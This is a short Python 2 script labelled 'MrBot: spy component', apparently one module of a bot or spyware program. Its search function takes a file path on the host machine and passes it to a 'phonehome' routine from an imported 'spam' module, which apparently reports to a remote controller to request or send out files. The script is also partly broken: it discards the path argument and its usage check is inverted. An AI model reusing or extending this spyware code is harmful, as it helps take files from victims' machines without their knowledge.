#!/usr/bin/env python
#
# MrBot: spy component 
#
# Date: Oct. 22, 2012
# All rights reserved.
#

import sys,os
import spam

def search(ktype, value, path):
	if ktype == 'file':
		try:
			if path is None:
				path = '.'
			spam.phonehome('Request file', os.path.join(path, value))
		except Exception as inst:
			print type(inst)
			print inst
	elif ktype == 'keyword':
		pass
	else:
		print 'Unknown command'

if __name__ == "__main__":
	if len(sys.argv) > 4:
		print "Usage: search <type> <value> <path>" 
		sys.exit(0)
	path=""
	search(sys.argv[1], sys.argv[2], path)
		
